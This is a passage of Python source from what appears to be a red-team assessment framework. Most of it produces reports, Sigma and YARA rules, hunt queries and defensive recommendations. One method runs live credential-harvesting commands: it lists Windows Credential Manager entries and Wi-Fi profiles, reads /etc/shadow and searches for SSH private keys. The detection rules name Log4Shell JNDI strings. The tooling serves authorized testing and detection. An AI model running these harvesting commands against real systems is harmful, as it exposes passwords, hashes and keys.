                "Passive DNS + WHOIS footprint of the target domain",
                "TCP port scan of the common service set with banner grabs",
                "HTTP/HTTPS service probe and technology fingerprint",
                "Public exposure review (sensitive paths, CORS, headers)",
            ] if recon_type == "network" else [
                "Host inventory and OS fingerprint",
                "User/group enumeration review",
                "Patch level and missing-update assessment",
            ],
            "recommendations": [
                "Run a live scan for real findings",
                "Implement network segmentation",
                "Disable unnecessary services",
            ],
        }

    # --------------------------------------------------------------------------
    # CREDENTIAL HARVESTING
    # --------------------------------------------------------------------------
    def _harvest_credentials_real(self, target: str, payload: Dict) -> Dict[str, Any]:
        """Real credential harvesting attempts."""
        platform = self._detect_platform()
        results = {"target": target, "platform": platform, "findings": []}

        if platform == "Windows":
            # Check for credential manager
            rc, out, err, meta = self._execute_shell(
                'cmdkey /list 2>&1',
                timeout=10
            )
            results["findings"].append({"source": "Credential Manager", "output": out or err})

            # Check for saved WiFi passwords
            rc2, out2, err2, meta2 = self._execute_shell(
                'netsh wlan show profiles 2>&1',
                timeout=10
            )
            results["findings"].append({"source": "WiFi Profiles", "output": out2 or err2})

        else:
            # Check for shadow file access
            rc, out, err, meta = self._execute_shell(
                "cat /etc/shadow 2>&1 | head -10",
                timeout=10
            )
            results["findings"].append({"source": "/etc/shadow", "output": out or err})

            # Check for SSH keys
            rc2, out2, err2, meta2 = self._execute_shell(
                "find /home /root -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null | head -10",
                timeout=10
            )
            results["findings"].append({"source": "SSH Private Keys", "output": out2 or err2})

        return results

    def _simulate_credential_harvesting(self, target: str, payload: Dict) -> Dict[str, Any]:
        """Simulate credential harvesting."""
        return {
            "target": target,
            "simulated": True,
            "credentials_found": [
                {"type": "NTLM hash", "value": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0", "source": "LSASS dump"},
                {"type": "Kerberos TGT", "value": "kirbi_ticket_simulated", "source": "Kerberoasting"},
                {"type": "cleartext", "value": "admin:Password123!", "source": "memory dump"},
            ],
            "recommendations": [
                "Implement credential guard",
                "Use managed service accounts",
                "Enable LSA protection",
                "Rotate credentials regularly",
            ],
        }

    # --------------------------------------------------------------------------
    # REPORTING & ANALYSIS HELPERS
    # --------------------------------------------------------------------------
    def _generate_executive_summary(self, chain: AttackChain) -> str:
        """Generate executive summary for an attack chain."""
        successful_ttps = [t for t in chain.ttps if t.success]
        critical_ttps = [t for t in successful_ttps if t.remediation_priority in [RiskLevel.CRITICAL, RiskLevel.HIGH]]

        summary = f"""
RED TEAM ASSESSMENT EXECUTIVE SUMMARY
Target: {chain.objective}
Assessment Date: {chain.completed_at or datetime.utcnow().isoformat()}
Risk Score: {chain.risk_score}/100

KEY FINDINGS:
- {len(successful_ttps)} of {len(chain.ttps)} attack techniques were successfully executed
- {len(critical_ttps)} critical/high-risk techniques succeeded
- Estimated time to compromise: {chain.estimated_time_to_compromise}
- Potential blast radius: {chain.blast_radius}

CRITICAL GAPS:
{chr(10).join(f"- {t.technique_id}: {t.technique_name} ({t.tactic})" for t in critical_ttps[:5])}

RECOMMENDATIONS:
1. Immediate: Deploy detection rules for successful TTPs
2. Short-term: Implement technical controls for critical gaps
3. Long-term: Conduct purple team exercise to validate improvements

This assessment simulates real-world adversary behavior. Immediate action is recommended.
"""
        return summary.strip()

    def _generate_executive_summary_full(self, target: str, risk_score: float,
                                         attack_chain: Dict, lateral: Dict, 
                                         persistence: Dict, exfil: Dict, 
                                         social: Dict) -> str:
        """Generate comprehensive executive summary."""
        return f"""
COMPREHENSIVE RED TEAM ASSESSMENT - EXECUTIVE SUMMARY
Organization: {target}
Assessment Date: {datetime.utcnow().strftime('%Y-%m-%d')}
Overall Risk Score: {risk_score}/100
Risk Level: {"CRITICAL" if risk_score >= 80 else "HIGH" if risk_score >= 60 else "MEDIUM" if risk_score >= 40 else "LOW"}

ASSESSMENT SCOPE:
This red team assessment evaluated the organization's security posture across multiple 
attack vectors including network penetration, persistence, data exfiltration, social 
engineering, and physical security.

KEY FINDINGS:
1. Attack Chain Simulation: {attack_chain.get('total_steps', 0)} MITRE ATT&CK techniques evaluated
2. Lateral Movement: Multiple pathways identified for network propagation
3. Persistence: {persistence.get('total_mechanisms', 0)} persistence mechanisms analyzed
4. Data Exfiltration: Multiple covert channels viable for data theft
5. Social Engineering: {social.get('risk_level', 'Unknown')} risk level for phishing campaigns

BUSINESS IMPACT:
A successful attack could result in:
- Unauthorized access to sensitive data
- Lateral movement across the enterprise network
- Long-term persistence undetected by current controls
- Data exfiltration via multiple covert channels
- Reputational damage from successful social engineering

IMMEDIATE ACTIONS REQUIRED:
1. Deploy enhanced detection rules for identified TTPs
2. Implement network segmentation to limit lateral movement
3. Strengthen email security controls
4. Conduct security awareness training
5. Review and update incident response procedures

RECOMMENDED INVESTMENT:
- EDR deployment with behavioral analytics
- Network detection and response (NDR)
- Security awareness training platform
- Purple team exercises (quarterly)
- External threat intelligence feeds
""".strip()

    def _extract_key_findings(self, attack_chain: Dict, lateral: Dict, 
                              persistence: Dict, exfil: Dict, social: Dict) -> List[Dict]:
        """Extract key findings from all assessment phases."""
        findings = []

        if isinstance(attack_chain, dict) and "timeline" in attack_chain:
            low_detect = [s for s in attack_chain["timeline"] if s.get("detection_likelihood") == "low"]
            if low_detect:
                findings.append({
                    "category": "Detection Gaps",
                    "severity": "HIGH",
                    "finding": f"{len(low_detect)} attack techniques have low detection likelihood",
                    "impact": "Adversary can operate undetected for extended periods",
                    "recommendation": "Implement behavioral detection and threat hunting",
                })

        if isinstance(persistence, dict) and "persistence_mechanisms" in persistence:
            high_diff = [m for m in persistence["persistence_mechanisms"] if m.get("difficulty") == "high"]
            if high_diff:
                findings.append({
                    "category": "Persistence",
                    "severity": "HIGH",
                    "finding": f"{len(high_diff)} high-difficulty persistence mechanisms available",
                    "impact": "Adversary can maintain long-term access",
                    "recommendation": "Deploy advanced EDR with memory protection",
                })

        if isinstance(social, dict) and social.get("risk_level") in ["HIGH", "CRITICAL"]:
            findings.append({
                "category": "Human Factor",
                "severity": social["risk_level"],
                "finding": f"Social engineering campaign risk: {social['risk_level']}",
                "impact": "Initial access via human compromise",
                "recommendation": "Implement phishing-resistant MFA and security training",
            })

        return findings

    def _calculate_mitre_coverage(self) -> Dict[str, Any]:
        """Calculate MITRE ATT&CK coverage from executed TTPs."""
        tactics_covered = set()
        techniques_covered = set()

        for ttp in self._ttp_history:
            tactics_covered.add(ttp.tactic)
            techniques_covered.add(ttp.technique_id)

        all_tactics = set(MITRE_TACTIC_WEIGHTS.keys())

        return {
            "tactics_tested": len(tactics_covered),
            "total_tactics": len(all_tactics),
            "tactics_coverage_percent": round(len(tactics_covered) / len(all_tactics) * 100, 1),
            "techniques_tested": len(techniques_covered),
            "tactics_covered": sorted(list(tactics_covered)),
            "techniques_covered": sorted(list(techniques_covered)),
            "gaps": sorted(list(all_tactics - tactics_covered)),
        }

    # --------------------------------------------------------------------------
    # DETECTION RULE GENERATION
    # --------------------------------------------------------------------------
    def _generate_sigma_rules(self, chain: AttackChain) -> List[str]:
        """Generate Sigma detection rules for attack chain."""
        rules = []
        for ttp in chain.ttps:
            if ttp.success:
                rule = f"""
title: CRIMSON - {ttp.technique_name}
status: experimental
description: Detects {ttp.technique_name} ({ttp.technique_id}) activity
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        - CommandLine|contains:
            - '{ttp.technique_id}'
    condition: selection
falsepositives:
    - Authorized red team activity
    - Legitimate administrative tasks
level: high
tags:
    - attack.{ttp.tactic.lower().replace(' ', '_')}
    - attack.{ttp.technique_id.lower().replace('.', '_')}
"""
                rules.append(rule.strip())
        return rules

    def _generate_sigma_rules_for_chain(self, chain: List[Dict]) -> List[str]:
        """Generate Sigma rules for simulated chain."""
        rules = []
        for step in chain:
            rule = f"""
title: CRIMSON - {step['name']}
status: experimental
description: Detects {step['name']} ({step['technique']}) activity
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        - CommandLine|contains:
            - '{step['technique']}'
    condition: selection
falsepositives:
    - Authorized red team activity
level: high
tags:
    - attack.{step['tactic'].lower().replace(' ', '_')}
    - attack.{step['technique'].lower().replace('.', '_')}
"""
            rules.append(rule.strip())
        return rules

    def _generate_yara_rules_for_chain(self, chain: List[Dict]) -> List[str]:
        """Generate YARA rules for simulated chain."""
        rules = []
        for step in chain:
            rule = f"""
rule CRIMSON_{step['technique'].replace('.', '_')}
{{
    meta:
        description = "Detects indicators of {step['name']}"
        author = "CRIMSON Red Team"
        reference = "https://attack.mitre.org/techniques/{step['technique']}/"
        date = "{datetime.utcnow().strftime('%Y-%m-%d')}"
    strings:
        $a = "{step['name']}" nocase
        $b = "{step['technique']}" nocase
    condition:
        any of them
}}
"""
            rules.append(rule.strip())
        return rules

    def _generate_lateral_movement_detection(self) -> List[str]:
        """Generate detection rules for lateral movement."""
        return [
            "Monitor for authentication anomalies (failed logins followed by success)",
            "Alert on service creation from non-admin workstations (Event ID 7045)",
            "Track Kerberos ticket usage patterns (Event ID 4769)",
            "Monitor SMB connections between non-server systems (Event ID 5156)",
            "Detect PsExec usage (Event ID 5145 with named pipes)",
            "Alert on WMI process creation (Event ID 5857, 5858, 5859)",
            "Monitor RDP connections from unusual sources (Event ID 4624, Type 10)",
        ]

    def _generate_persistence_hunt_queries(self) -> List[str]:
        """Generate threat hunting queries for persistence."""
        return [
            "Search for new registry run keys: reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "Hunt for WMI event subscriptions: Get-WmiObject -Class __EventFilter -Namespace root\\subscription",
            "Find new scheduled tasks: schtasks /query /fo CSV | findstr /i \"created\"",
            "Check for new services: sc query type= service start= auto | findstr /i \"new\"",
            "Hunt for cron modifications: find /etc/cron* -mtime -1",
            "Search for new systemd units: ls -lt /etc/systemd/system/ | head -20",
            "Check for new SSH authorized_keys: find /home -name authorized_keys -mtime -1",
        ]

    def _generate_persistence_sigma_rules(self) -> List[str]:
        """Generate Sigma rules for persistence detection."""
        return [
            """
title: New Service Installation
logsource:
    product: windows
    service: system
detection:
    selection:
        EventID: 7045
    condition: selection
level: medium
""",
            """
title: Registry Run Key Modification
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4657
        ObjectName|contains: '\\Run'
    condition: selection
level: high
""",
        ]

    def _generate_dlp_rules(self) -> List[str]:
        """Generate DLP rules for exfiltration prevention."""
        return [
            "Block uploads to personal cloud storage (Dropbox, Google Drive, OneDrive personal)",
            "Monitor for large data transfers to external IPs (>100MB)",
            "Alert on DNS queries with high entropy subdomains (DNS tunneling)",
            "Block ICMP packets with large payloads (>64 bytes)",
            "Monitor for base64-encoded data in HTTP POST requests",
            "Alert on compressed archives created in temp directories",
            "Detect steganography tools (steghide, OpenStego)",
        ]

    def _generate_exploit_detection_rules(self, cve: str, exploit_info: Dict) -> List[str]:
        """Generate detection rules for specific CVEs."""
        rules = []
        if "Log4Shell" in exploit_info.get("name", ""):
            rules.append("Monitor for JNDI lookup strings: ${jndi:ldap://, ${jndi:dns://, ${jndi:rmi://}")
            rules.append("Alert on outbound LDAP connections from Java processes")
            rules.append("Detect base64-encoded JNDI strings in HTTP headers")
        elif "OpenSSH" in exploit_info.get("name", ""):
            rules.append("Monitor for SSH agent forwarding to untrusted hosts")
            rules.append("Alert on unusual SSH key operations")
        return rules

    def _generate_evasion_detection_rules(self, evasion_type: str) -> List[str]:
        """Generate detection rules for evasion techniques."""
        rules = {
            "amsi_bypass": [
                "Monitor for .NET reflection targeting AmsiUtils",
                "Detect PowerShell commands modifying AMSI initialization",
                "Alert on AMSI DLL unloads in PowerShell processes",
            ],
            "etw_patching": [
                "Monitor for ntdll.dll memory modifications",
                "Detect ETW provider state changes",
                "Alert on suspicious memory protection changes",
            ],
            "log_clearing": [
                "Alert on Event ID 1102 (Security log cleared)",
                "Monitor for wevtutil usage with 'cl' parameter",
                "Detect PowerShell Clear-EventLog execution",
            ],
            "timestomping": [
                "Monitor for file timestamp modifications",
                "Detect touch command with -t parameter",
                "Alert on SetFileTime API calls",
            ],
        }
        return rules.get(evasion_type, ["Monitor for anomalous behavior"])

    def _get_data_sources_for_technique(self, technique_id: str) -> List[str]:
        """Get relevant data sources for MITRE technique."""
        data_sources = {
            "T1003": ["Process command-line parameters", "Process monitoring", "API monitoring"],
            "T1059": ["Process command-line parameters", "Process monitoring", "PowerShell logs"],
            "T1071": ["Network traffic content", "Network connection monitoring", "SSL/TLS inspection"],
            "T1021": ["Authentication logs", "Network connection monitoring", "Process monitoring"],
            "T1053": ["Windows Event logs", "File monitoring", "Process monitoring"],
            "T1547": ["Windows Registry", "File monitoring", "Process monitoring"],
            "T1566": ["Email gateway logs", "Network traffic content", "Endpoint logs"],
            "T1190": ["Web server logs", "Network traffic content", "Application logs"],
        }
        return data_sources.get(technique_id, ["Process monitoring", "Network traffic monitoring"])

    def _get_detection_strategies(self, technique_id: str) -> List[str]:
        """Get detection strategies for MITRE technique."""
        strategies = {
            "T1003": ["Monitor for LSASS access", "Detect SAM hive dumps", "Alert on credential access APIs"],
            "T1059": ["Monitor for suspicious command execution", "Detect encoded commands", "Alert on interpreter abuse"],
            "T1071": ["Monitor for beaconing behavior", "Detect unusual C2 protocols", "Alert on DNS anomalies"],
            "T1021": ["Monitor for authentication anomalies", "Detect unusual remote connections", "Alert on lateral movement patterns"],
            "T1053": ["Monitor for new scheduled tasks", "Detect cron modifications", "Alert on task execution anomalies"],
            "T1547": ["Monitor registry run keys", "Detect startup folder changes", "Alert on autostart modifications"],
        }
        return strategies.get(technique_id, ["Behavioral monitoring", "Anomaly detection"])


    # --------------------------------------------------------------------------
    # RECOMMENDATION HELPERS
    # --------------------------------------------------------------------------
    def _get_mitre_recommendations(self) -> List[str]:
        return [
            "Implement behavioral detection for each TTP using EDR/NDR platforms",
            "Use deception technology (honeypots, honeytokens, honeyfiles)",
            "Deploy EDR with native MITRE ATT&CK mapping and automated response",
            "Conduct regular purple team exercises with realistic scenarios",
            "Implement network segmentation with zero-trust architecture",
            "Enable PowerShell Script Block Logging and Transcription",
            "Deploy Application Control (AppLocker/WDAC) to prevent unauthorized execution",
            "Implement Windows Defender Attack Surface Reduction (ASR) rules",
            "Use Credential Guard and LSA protection on all endpoints",
            "Deploy centralized logging with SIEM correlation for all security events",
        ]

    def _get_lateral_recommendations(self) -> List[str]:
        return [
            "Monitor for authentication anomalies (failed-then-success patterns)",
            "Alert on service creation from non-admin workstations (Event ID 7045)",
            "Track Kerberos ticket usage patterns (Event ID 4769, 4776)",
            "Monitor SMB connections between non-server systems (Event ID 5156)",
            "Implement privileged access workstations (PAWs) for admin tasks",
            "Deploy Local Administrator Password Solution (LAPS)",
            "Restrict RDP access with network-level authentication and gateway",
            "Implement Just Enough Administration (JEA) for PowerShell remoting",
            "Use Windows Defender Firewall to restrict lateral SMB traffic",
            "Deploy network detection and response (NDR) for east-west traffic",
        ]

    def _get_persistence_recommendations(self) -> List[str]:
        return [
            "Implement file integrity monitoring (FIM) on critical directories",
            "Monitor registry and file system changes with Sysmon (Event IDs 12-14)",
            "Use EDR to detect anomalous process behavior and memory injections",
            "Regularly audit scheduled tasks, services, and startup items",
            "Monitor WMI event subscriptions (Sysmon Event IDs 19-21)",
            "Deploy application control to prevent unauthorized executables",
            "Use Windows Event Forwarding for centralized log collection",
            "Implement immutable backups with air-gapped storage",
            "Deploy endpoint detection with behavioral analytics",
            "Conduct regular threat hunting for persistence mechanisms",
        ]

    def _get_exfil_recommendations(self) -> List[str]:
        return [
            "Implement Data Loss Prevention (DLP) with content inspection",
            "Monitor egress traffic volume and patterns with NDR",
            "Use User and Entity Behavior Analytics (UEBA) for anomaly detection",
            "Implement network segmentation with egress filtering",
            "Deploy CASB for cloud access control and shadow IT discovery",
            "Block personal cloud storage and unauthorized file sharing",
            "Monitor for DNS tunneling with entropy analysis",
            "Implement HTTPS inspection for outbound traffic",
            "Deploy USB device control and encryption",
            "Use data classification and rights management (RMS)",
        ]

    # --------------------------------------------------------------------------
    # UNIT TESTS
    # --------------------------------------------------------------------------
    def test_ttp_execution(self) -> bool:
        record = self.execute_ttp("T1059", "localhost", {"command": "echo 'CRIMSON_TEST'"})
        assert record.technique_id == "T1059"
        assert record.status in [TTPStatus.SUCCESS, TTPStatus.FAILED]
        return True

    def test_attack_chain_building(self) -> bool:
        chain = self.build_attack_chain("test_chain", "Test", ["T1059", "T1003"])
        assert chain.chain_id.startswith("chain_")
        assert len(chain.ttps) == 2
        return True

    def test_social_engineering(self) -> bool:
        campaign = self.generate_social_engineering_campaign("TestCorp", "phishing")
        assert "campaign_id" in campaign
        assert "template" in campaign
        return True

    def test_exfiltration(self) -> bool:
        result = self.simulate_exfiltration("test_data", "http://127.0.0.1:8080/exfil", "https")
        assert "bytes_transferred" in result
        return True

    def test_persistence(self) -> bool:
        result = self.test_persistence_mechanisms("localhost", ["cron", "systemd"])
        assert "cron" in result
        assert "systemd" in result
        return True

    def test_evasion(self) -> bool:
        result = self.simulate_evasion_technique("amsi_bypass", "localhost")
        assert "technique" in result
        assert "detection_rules" in result
        return True

    def test_full_assessment(self) -> bool:
        result = self.full_red_team_assessment("test-target", {})
        assert "phases" in result
        assert "executive_summary" in result
        return True

    def run_all_tests(self) -> Dict[str, bool]:
        """Run all unit tests and return results."""
        tests = {
            "ttp_execution": self.test_ttp_execution,
            "attack_chain_building": self.test_attack_chain_building,
            "social_engineering": self.test_social_engineering,
            "exfiltration": self.test_exfiltration,
            "persistence": self.test_persistence,
            "evasion": self.test_evasion,
            "full_assessment": self.test_full_assessment,
        }
        results = {}
        for name, test_func in tests.items():
            try:
                results[name] = test_func()
            except Exception as e:
                results[name] = False
                self._logger.error(f"[CRIMSON] Test {name} failed: {e}")
        return results


# ==============================================================================
# EXPORT
# ==============================================================================
# Alias for backwards compatibility
RedSpecter = RedSpecter

__all__ = ["RedSpecter", "TTPRecord", "AttackChain", "IOC", "Artifact", 
           "CampaignMetrics", "NetworkSegment", "TTPStatus", "ChainPhase", "RiskLevel"]
